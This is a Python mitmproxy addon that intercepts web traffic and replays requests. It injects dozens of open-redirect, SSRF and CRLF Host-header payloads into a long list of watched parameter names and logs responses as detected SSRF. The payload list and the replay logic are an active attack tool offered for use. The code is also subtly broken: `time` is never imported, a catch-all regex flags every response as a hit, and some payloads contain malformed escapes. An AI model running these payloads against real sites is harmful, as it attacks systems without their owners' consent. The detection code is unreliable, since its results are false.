from mitmproxy import http, ctx
from mitmproxy.io import FlowWriter
import copy
import os
import re
import urllib.parse
import json

class SSRF:
    def __init__(self):
        self.flow_dir = "SSRF"
        os.makedirs(self.flow_dir, exist_ok=True)

        # Corrected the invalid escape sequences and changed some strings to raw strings
        self.payload_template = [
    "//www.google.com/%2f..",
    r"//{host}@www.google.com/%2f..",
    "///www.google.com/%2f..",
    "https://www.google.com",
    r"///{host}@www.google.com/%2f..",
    "////www.google.com/%2f..",
    r"////{host}@www.google.com/%2f..",
    "https://www.google.com/%2f..",
    r"https://{host}@www.google.com/%2f..",
    "/https://www.google.com/%2f..",
    r"/https://{host}@www.google.com/%2f..",
    "//www.google.com/%2f%2e%2e",
    r"//{host}@www.google.com/%2f%2e%2e",
    "///www.google.com/%2f%2e%2e",
    r"///{host}@www.google.com/%2f%2e%2e",
    "////www.google.com/%2f%2e%2e",
    r"////{host}@www.google.com/%2f%2e%2e",
    "https://www.google.com/%2f%2e%2e",
    r"https://{host}@www.google.com/%2f%2e%2e",
    "/https://www.google.com/%2f%2e%2e",
    r"/https://{host}@www.google.com/%2f%2e%2e",
    "//www.google.com/",
    r"//{host}@www.google.com/",
    "///www.google.com/",
    r"///{host}@www.google.com/",
    "////www.google.com/",
    r"////{host}@www.google.com/",
    "https://www.google.com/",
    r"https://{host}@www.google.com/",
    "/https://www.google.com/",
    r"/https://{host}@www.google.com/",
    "//www.google.com//",
    r"//{host}@www.google.com//",
    "///www.google.com//",
    r"///{host}@www.google.com//",
    "////www.google.com//",
    r"////{host}@www.google.com//",
    "https://www.google.com//",
    r"https://{host}@www.google.com//",
    "//https://www.google.com//",
    r"//https://{host}@www.google.com//",
    "//www.google.com/%2e%2e%2f",
    r"//{host}@www.google.com/%2e%2e%2f",
    "///www.google.com/%2e%2e%2f",
    r"///{host}@www.google.com/%2e%2e%2f",
    "////www.google.com/%2e%2e%2f",
    r"////{host}@www.google.com/%2e%2e%2f",
    "https://www.google.com/%2e%2e%2f",
    r"https://{host}@www.google.com/%2e%2e%2f",
    "//https://www.google.com/%2e%2e%2f",
    r"//https://{host}@www.google.com/%2e%2e%2f",
    "///www.google.com/%2e%2e",
    r"///{host}@www.google.com/%2e%2e",
    "////www.google.com/%2e%2e",
    r"////{host}@www.google.com/%2e%2e",
    "https:///www.google.com/%2e%2e",
    r"https:///{host}@www.google.com/%2e%2e",
    "//https:///www.google.com/%2e%2e",
    r"//{host}@https:///www.google.com/%2e%2e",
    "/https://www.google.com/%2e%2e",
    r"/https://{host}@www.google.com/%2e%2e",
    "///www.google.com/%2f%2e%2e",
    r"///{host}@www.google.com/%2f%2e%2e",
    "////www.google.com/%2f%2e%2e",
    r"////{host}@www.google.com/%2f%2e%2e",
    "https:///www.google.com/%2f%2e%2e",
    r"https:///{host}@www.google.com/%2f%2e%2e",
    "/https://www.google.com/%2f%2e%2e",
    r"/https://{host}@www.google.com/%2f%2e%2e",
    "/https:///www.google.com/%2f%2e%2e",
    r"/https:///{host}@www.google.com/%2f%2e%2e",
    "/%09/www.google.com",
    r"/%09/{host}@www.google.com",
    "//%09/www.google.com",
    r"//%09/{host}@www.google.com",
    "///%09/www.google.com",
    r"///%09/{host}@www.google.com",
    "////%09/www.google.com",
    r"////%09/{host}@www.google.com",
    "https://%09/www.google.com",
    r"https://%09/{host}@www.google.com",
    "/%5cwww.google.com",
    r"/%5c{host}@www.google.com",
    "//%5cwww.google.com",
    r"//%5c{host}@www.google.com",
    "///%5cwww.google.com",
    r"///%5c{host}@www.google.com",
    "////%5cwww.google.com",
    r"////%5c{host}@www.google.com",
    "https://%5cwww.google.com",
    r"https://%5c{host}@www.google.com",
    "/https://%5cwww.google.com",
    r"/https://%5c{host}@www.google.com",
    "https://www.google.com",
    r"https://{host}@www.google.com",
    "//www.google.com",
    "https:www.google.com",
    r"\/\/www.google.com/",
    r"/\/wwww.google.com/",
    r"https://{host}/https://www.google.com/",
    "〱www.google.com",
    "〵www.google.com",
    "ゝwww.google.com",
    "ーwww.google.com",
    "ｰwww.google.com",
    "/〱www.google.com",
    "/〵www.google.com",
    "/ゝwww.google.com",
    "/ーwww.google.com",
    "/ｰwww.google.com",
    "<>//www.google.com",
    r"//www.google.com\@{host}",
    r"https://:@www.google.com\@{host}",
    r"http://www.google.com:80#@{host}/",
    r"http://www.google.com:80?@{host}/",
    r"http://www.google.com\{host}",
    r"http://www.google.com&{host}",
    "http:///////////www.google.com",
    r"\\www.google.com",
    r"http://{host}.www.google.com","%0AHost:%20www.google.com", "%0A%20Host:%20www.google.com", "%20%0AHost:%20www.google.com", "%23%OAHost:%20www.google.com", "%E5%98%8A%E5%98%8DHost:%20www.google.com", "%E5%98%8A%E5%98%8D%0AHost:%20www.google.com", "%3F%0AHost:%20www.google.com", "crlf%0AHost:%20www.google.com", "crlf%0A%20Host:%20www.google.com", "crlf%20%0AHost:%20www.google.com", "crlf%23%OAHost:%20www.google.com", "crlf%E5%98%8A%E5%98%8DHost:%20www.google.com", "crlf%E5%98%8A%E5%98%8D%0AHost:%20www.google.com", "crlf%3F%0AHost:%20www.google.com", "%0DHost:%20www.google.com", "%0D%20Host:%20www.google.com", "%20%0DHost:%20www.google.com", "%23%0DHost:%20www.google.com", "%23%0AHost:%20www.google.com", "%E5%98%8A%E5%98%8DHost:%20www.google.com", "%E5%98%8A%E5%98%8D%0DHost:%20www.google.com", "%3F%0DHost:%20www.google.com", "crlf%0DHost:%20www.google.com", "crlf%0D%20Host:%20www.google.com", "crlf%20%0DHost:%20www.google.com", "crlf%23%0DHost:%20www.google.com", "crlf%23%0AHost:%20www.google.com", "crlf%E5%98%8A%E5%98%8DHost:%20www.google.com", "crlf%E5%98%8A%E5%98%8D%0DHost:%20www.google.com", "crlf%3F%0DHost:%20www.google.com", "%0D%0AHost:%20www.google.com", "%0D%0A%20Host:%20www.google.com", "%20%0D%0AHost:%20www.google.com", "%23%0D%0AHost:%20www.google.com", "\r\nHost:%20www.google.com", "\r\n Host:%20www.google.com", "\r\n Host:%20www.google.com", "%5cr%5cnHost:%20www.google.com", "%E5%98%8A%E5%98%8DHost:%20www.google.com", "%E5%98%8A%E5%98%8D%0D%0AHost:%20www.google.com", "%3F%0D%0AHost:%20www.google.com", "crlf%0D%0AHost:%20www.google.com", "crlf%0D%0A%20Host:%20www.google.com", "crlf%20%0D%0AHost:%20www.google.com", "crlf%23%0D%0AHost:%20www.google.com", "crlf\r\nHost:%20www.google.com", "crlf%5cr%5cnHost:%20www.google.com", "crlf%E5%98%8A%E5%98%8DHost:%20www.google.com", "crlf%E5%98%8A%E5%98%8D%0D%0AHost:%20www.google.com", "crlf%3F%0D%0AHost:%20www.google.com", "%0D%0A%09Host:%20www.google.com", "crlf%0D%0A%09Host:%20www.google.com", "%250AHost:%20www.google.com", "%25250AHost:%20www.google.com", "%%0A0AHost:%20www.google.com", "%25%30AHost:%20www.google.com", "%25%30%61Host:%20www.google.com", "%u000AHost:%20www.google.com"
]

        self.altered_header = "x-altered"
        self.watched_parameters = ["temp", "pass", "background", "page_id", "start", "limit", "offset", "access_log", "album", "bg", "body", "cid", "content_file", "count", "css", "database", "default", "description", "dirTraversal", "document_root", "docPath", "download_file", "email", "error", "eval", "example", "flag", "function", "get", "glob", "graphic", "HTTP_CONTENT_DISPOSITION", "image", "index", "input_file", "ip", "item", "key", "left", "lib", "log", "main", "max_filesize", "media", "month", "msg", "name_file", "name", "number", "op", "option", "param", "path_info", "pattern", "pdf_file", "perl", "photo", "poc", "post", "prev", "printer", "print", "process", "product", "project", "proxy", "pub", "q", "read", "real_path", "recipe", "ref", "resource", "row", "rss_file", "s", "scheme", "section", "select", "server", "set", "setting", "shortcut", "skin_file", "skin_path", "slider", "sql_file", "src", "start_date", "state", "stat", "status", "store", "string", "style_file", "sub", "subpage", "subject", "suffix", "support", "symlink", "system", "tab", "table", "target", "temp_file", "time", "tmp", "top", "topic", "track", "type_file", "uid", "url_file", "user", "value_file", "webpage", "week", "widget", "width", "wp", "year", "yui", "img_path", "gallery", "i", "z", "language_file", "asset", "file_id", "blog_id", "ID", "error_page", "rating", "response", "base", "bgimage", "session_id", "directory", "docid", "embed", "embedded", "encoding", "event", "filepath", "filetype", "f", "frame", "frm", "func", "func_file", "get_var", "graphic_file", "gravatar", "h", "heading", "home", "hostname", "html_file", "http_referer", "i18n", "image_path", "inc_file", "index_file", "input_data", "j", "js", "key_file", "l", "language", "left_nav", "lg", "link", "logfile", "logo", "logo_file", "main_file", "mod", "navigation_file", "new", "newlang", "news", "node", "nodeid", "old", "oldlang", "option_file", "page_file", "param_file", "pathname", "phpbb_root_path", "pic", "picture", "preview", "profile", "property", "pubid", "r", "readfile", "referer", "remote_file", "resource_file", "s_file", "schema", "script_path", "section_file", "session", "skin", "source", "sql", "src_file", "ss", "ssi", "start", "stats", "style_path", "stylesheet", "subdir", "subfolder", "system_file", "thumb_path", "thumb", "tmp_file", "token", "t", "update", "user_file", "username", "util", "value", "var", "w", "web_file", "webdir", "welcome", "zlib", "content", "cmdi", "type", "charset", "extension", "rootpath", "docroot", "prefix_path", "allow_url_fopen", "allow_url_include", "auto_prepend_file", "auto_append_file", "php_include", "php_input", "php_output", "php_ext", "php_charset", "php_root", "phpdocroot", "phpsessionid", "phpmyadmin", "phpquery", "phpcfdiprefix", "phpcgiprefix", "phpfcgiprefix", "phpsufix", "phpaction", "phpfile", "phppath", "phpprefix", "phptemplate", "phptype", "phpuri", "phpurl", "phpuser", "phpvalue", "phpvar", "phpsessid", "phppathinfo", "action", "handler", "pfile", "id", "modulename", "dfile", "method", "currentfolder", "filedownload", "dispatch", "content_id", "title", "category", "asset_path", "base_url", "site_path", "module_name", "plugin_name", "plugin_path", "module_path", "lang_path", "cache_dir", "cache_path", "backup_path", "doc_path", "report_path", "global_file", "configuration_file", "sql_path", "ftp_root", "home_dir", "server_name", "script_path_info", "request_uri", "doc_file", "dir_path", "root_dir_path", "folder_path", "album_path", "attach_path", "path_file", "calendar_path", "include_dir", "base_dir", "root_dir", "web_root", "website_path", "url_path", "document_path", "main_path", "template_path", "filedata", "include_path", "styles_dir", "wp_path", "service", "vmcms_root", "skin_dir", "style_dir", "theme_path", "theme_dir", "directory_path", "download_path", "file_path", "php_cgi", "php", "query_string", "params", "fn", "upload", "load_file", "server_file", "log_file", "access_log_file", "error_log_file", "system_log_file", "cron_log_file", "debug_log_file", "test_file", "output_file", "source_file", "data_file", "config_file", "config", "settings_file", "settings", "setup_file", "setup", "db_file", "db", "include_file", "include", "template_file", "template", "theme_file", "theme", "header_file", "header", "footer_file", "footer", "nav_file", "nav", "sidebar_file", "sidebar", "menu_file", "menu", "lang_file", "lang", "locale_file", "locale", "view_file", "controller_file", "controller", "model_file", "model", "helper_file", "helper", "library_file", "library", "plugin_file", "plugin", "module_file", "module", "class_file", "class", "script_file", "script", "batch_file", "batch", "exec_file", "cmd_file", "cmd", "query_file", "query", "cmdline_file", "cmdline", "command_file", "command", "text_file", "text", "json_file", "json", "xml_file", "xml", "csv_file", "csv", "log_level", "access_level", "error_level", "debug_level", "verbose_level", "quiet_level", "report_file", "report", "result_file", "result", "output", "input", "access", "admin", "dbg", "debug", "edit", "grant", "test", "alter", "clone", "create", "delete", "disable", "enable", "exec", "execute", "load", "make", "modify", "rename", "reset", "shell", "toggle", "adm", "root", "cfg", "dest", "redirect", "uri", "path", "continue", "url", "window", "next", "data", "reference", "site", "html", "val", "validate", "domain", "callback", "return", "page", "feed", "host", "port", "to", "out", "view", "dir", "show", "navigation", "open", "file", "document", "folder", "pg", "php_path", "style", "doc", "img", "filename","outurl", "redirectionURL", "refURL", "returnURL", "siteurl", "targetURL", "urlTo", "redirectLocation", "redirectPage", "redirectPath", "redirectUrlTo", "urlRedirect", "redirectTo", "linkTo", "urlOut", "outboundUrl", "navTo", "jumpTo", "clickTo", "linkURL", "directTo", "moveTo", "outgoing_url", "outbound_link", "location_to", "forward", "from_url", "go", "goto", "host", "html", "image_url", "img_url", "load_file", "load_url", "login?to", "login_url", "logout", "navigation", "next", "next_page", "out", "page", "page_url", "path", "port", "redir", "redirect", "redirect_to", "redirect_uri", "redirect_url", "reference", "return", "returnTo", "return_path", "return_to", "return_url", "rt", "rurl", "show", "site", "target", "to", "uri", "url", "val", "validate", "view", "window", "location", "link", "click", "move", "jump", "follow", "nav", "ref", "locationURL", "redirectURL", "redirect_to_url", "pageurl", "navigate", "returnUrl", "redirectlink", "redirection", "referral", "direct", "forwardto", "gotoURL", "outlink", "targ", "linkto", "sendto", "dest", "destURL", "destination", "finalURL", "newUrl", "goToUrl", "navToURL", "referralURL", "returnURI", "uri_redirect", "path_redirect", "url_redirect", "location_redirect", "returnPath", "returnToURL", "outgoingURL", "redirectURI", "redirect_path", "redirect_url_path", "targetPath", "clickTarget", "followURL", "linkOut", "location_href", "jumpURL", "returnLink", "refLink", "sendURL", "url_destination", "redirect_destination", "goto_url", "forward_url", "nav_to", "move_to_url", "url_location", "redirect_location", "target_url", "target_link", "return_url_path", "return_to_path", "outgoing_link", "link_destination", "click_destination", "redirector", "redirection_link", "uri_location", "url_path", "path_to", "path_redirector", "go_url", "forward_link", "location_path"]

    def response(self, flow: http.HTTPFlow) -> None:
        if self.altered_header in flow.request.headers:
            self.check_altered_reflection(flow)
            return

        if flow.request.method in ["GET", "POST"]:
            self.process_parameters(flow)

    def process_parameters(self, flow):
        params = {}  
        if flow.request.method == "GET":
            params = flow.request.query
        elif flow.request.method == "POST":
            content_type = flow.request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                params = urllib.parse.parse_qs(flow.request.get_text())
            elif "application/json" in content_type:
                try:
                    params = json.loads(flow.request.get_text())
                    if not isinstance(params, dict):
                        params = {}
                except json.JSONDecodeError:
                    ctx.log.info("JSON decode error")
                    params = {}

        for watched_param in self.watched_parameters:
            if watched_param in params:
                value = params[watched_param][0] if isinstance(params[watched_param], list) else params[watched_param]
                self.alter_and_replay(flow, watched_param, value)

    def alter_and_replay(self, original_flow, param, original_value):
        host = original_flow.request.host
        for template in self.payload_template:
            altered_value = template.format(host=host)  
            altered_flow = self.alter_request(original_flow, param, altered_value)
            if altered_flow:
                ctx.master.commands.call("replay.client", [altered_flow])

    def alter_request(self, original_flow, param, altered_value):
        new_request = copy.deepcopy(original_flow.request)
        if original_flow.request.method == "GET":
            new_request.query[param] = altered_value
        else:
            content_type = new_request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                params = urllib.parse.parse_qs(new_request.get_text())
                params[param] = [altered_value]
                new_request.text = urllib.parse.urlencode(params, doseq=True)
            elif "application/json" in content_type:
                try:
                    body = json.loads(new_request.get_text())
                    if param in body and isinstance(body[param], str):
                        body[param] = altered_value
                        new_request.text = json.dumps(body)
                except json.JSONDecodeError:
                    pass
        new_request.headers[self.altered_header] = "true"
        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
        altered_flow.request = new_request
        return altered_flow
        
      

    def check_altered_reflection(self, flow):

        pattern = r'.*'
        location = flow.response.headers.get("Host", "")
        if re.search(pattern, location):
            self.save_flow(flow)
            return
        response_text = flow.response.get_text()
        redirect_patterns = [
            r'(was not found on this server|Google Search)',
        ]
        for pattern in redirect_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                self.save_flow(flow)
                break

    def save_flow(self, flow):
        filename = os.path.join(self.flow_dir, f"captured_request_{int(time.time())}.mitm")
        try:
            with open(filename, "wb") as file:
                fw = FlowWriter(file)
                fw.add(flow)
            ctx.log.info(f"SSRF detect {filename}")
        except OSError as e:
            ctx.log.error(f"Error saving .mitm file: {e}")

addons = [SSRF()]


